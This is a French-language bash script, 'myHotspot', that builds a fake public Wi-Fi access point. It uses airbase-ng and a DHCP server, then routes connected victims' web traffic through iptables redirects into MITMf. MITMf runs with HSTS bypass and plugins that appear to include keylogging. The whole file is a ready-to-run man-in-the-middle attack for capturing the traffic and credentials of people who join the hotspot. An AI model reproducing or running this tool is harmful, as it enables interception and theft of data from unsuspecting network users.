#!/bin/bash
# Copyright (C) 2015 - Nyzo
# myHotspot - version 1.3

if [[ $EUID -ne 0 ]]; then
  echo "Vous devez être en root (su root)" 2>&1
  exit 1
fi

#Initialisation paramètres console
txtrst="\e[0m"  #Réinitialisation du texte, blanc
warn="\e[0;31m" #Alerte, rouge
q="\e[0;32m"    #Question, vert
info="\e[0;33m" #Info, jaune

init_fn() {

#Vérification des installations
#DHCP
if [[ ! -x /usr/sbin/dhcpd ]];then
  echo -e "$info\n[$warn✘$info] isc-dhcp-server n'est pas installé !"
  sleep 1
  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n) $txtrst"
  read var
  if [[ $var == y ]];then
    apt-get install isc-dhcp-server
  else
    exit_fn
  fi
else
echo -e "$info\n[$q✔$info] isc-dhcp-server installé"
fi
#MITMf
if [[ ! -x /etc/MITMf ]];then
  echo -e "$info\n[$warn✘$info] MITMf n'est pas installé !"
  sleep 1
  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)$txtrst"
  read var
  if [[ $var == y ]];then
    cd /etc
    git clone https://github.com/byt3bl33d3r/MITMf.git
    apt-get install python
    cd MITMf
    pip install -r requirements.txt
    ./setup.sh
    sleep 1
    echo -e "$info\n[$q✔$info] Installation terminée$txtrst"
  else
    exit_fn
  fi
else
  echo -e "$info[$q✔$info] MITMf installé"
  sleep 1
  echo -e "$info\n[$q+$info] Mise à jour de MITMf$txtrst"
  cd /etc/MITMf
  ./update.sh
  cd /etc/myHotspot
  echo -e "$info[$q✔$info] Mise à jour de MITMf terminée"
fi

#Mise à jour
echo -e "$info\n[$q+$info] Mise à jour de myHotspot$txtrst"
git pull
echo -e "$info[$q✔$info] Mise à jour de myHotspot terminée$txtrst"

# Initialisation
echo
echo " - myHotspot - Version 1.3 - Par Nyzo - "
echo
route -n -A inet | grep UG
echo
echo -e -n "$q\nEntrez l'IP connectée à un réseau, listée ci-dessus : $txtrst\n"
read -e gatewayip
echo -e -n "$q\nEntrez l'interface connectée à un réseau, listée ci-dessus. Sélectionnez l'interface associée à l'IP précédemment choisie : $txtrst\n"
read -e internet_interface
echo -e -n "$q\nEntrez l'interface que vous souhaitez utiliser pour créer le point d'accès wifi. L'interface ne doit pas être connectée à internet : $txtrst\n"
read -e fakeap_interface
echo -e -n "$q\nEntrez le nom que vous souhaitez donner au point d'accès wifi (Ex: FreeWifi) : $txtrst\n"
read -e ESSID
airmon-ng start $fakeap_interface
fakeap=$fakeap_interface
fakeap_interface="mon0"
listenport="10000"
setup_fn
echo -e -n "$txtrst\n"
}

setup_fn() {

trap exit_fn INT

# Création de la configuration DHCP
mkdir -p "/pentest/wireless/myhotspot"
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "\"$ESSID\"";
option domain-name-servers 10.0.0.1;

range 10.0.0.20 10.0.0.50;

}" > /pentest/wireless/myhotspot/dhcpd.conf

# Création du point d'accès wifi
echo -e "$info\n[$q+$info] Configuration du point d'accès wifi $warn"
xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & airbaseid=$!
disown
sleep 3

# Tables
echo -e "$info\n[$q+$info] Configurations des tables et des redirections $warn"
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --flush --table nat
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat -A POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables --table nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $listenport   #HTTP
iptables --table nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports $listenport #HTTPS
sleep 3

# DHCP
echo -e "$info\n[$q+$info] Configuration et démarrage DHCP$txtrst"
sleep 2
chmod 777 /var/run/
touch /var/run/dhcpd.pid
chmod 777 /var/run/dhcpd.pid
chown dhcpd:dhcpd /var/run/dhcpd.pid
xterm -xrm '*hold: true' -geometry 75x20+1+240 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dhcpdid=$!
disown
sleep 1

# MITMf
echo -e "$info\n[$q+$info] Configuration et démarrage de MITMf $warn"
cd /etc/MITMf
echo -e "$txtrst"
python mitmf.py -i at0 --hsts -f -k -a & mitmfid=$!
cd /etc/myHotspot
sleep 4

#Finalisation
clear
echo -e "$info[$q✔$info] Initialistion terminée $txtrst\n"
echo "> Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
echo -e "$txtrst>$warn IMPORTANT$txtrst: Pour quitter, pressez q ou appuyez sur Ctrl+C, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. $txtrst\n"
read QUIT
if [ $QUIT == "q" ] ; then
exit_fn
else
read QUIT
fi
}

# Nettoyage
exit_fn() {
echo -e "$info\n[$q+$info] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux.$warn\n"
kill ${airbaseid}
echo -e "$info\n[$q✔$info] Airbase-ng (fake ap) stoppé $warn\n"
kill ${dhcpdid}
echo -e "$info[$q✔$info] DHCP stoppé $warn\n"
kill ${mitmfid}
echo -e "$info[$q✔$info] MITMf stoppé $warn"
sleep 1
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables -F
iptables -F -t nat
iptables --delete-chain
iptables -t nat --delete-chain
echo -e "$info[$q✔$info] iptables restaurée $txtrst\n"
sleep 1
airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
echo -e "$info[$q✔$info] Airmon-ng stoppé $txtrst\n"
sleep 1
echo
ifconfig $internet_interface up
/etc/init.d/networking stop && /etc/init.d/networking start
echo -e "$info\n[$q✔$info] Redémarrage du système internet"
echo -e "[$q✔$info] Nettoyage et restauration terminé !"
echo -e "[$q+$info] Merci d'utiliser myHotspot et à bientôt !"
echo -e -n "\e[0m" #Réinitialisation du texte
sleep 3
clear
exit
}

init_fn
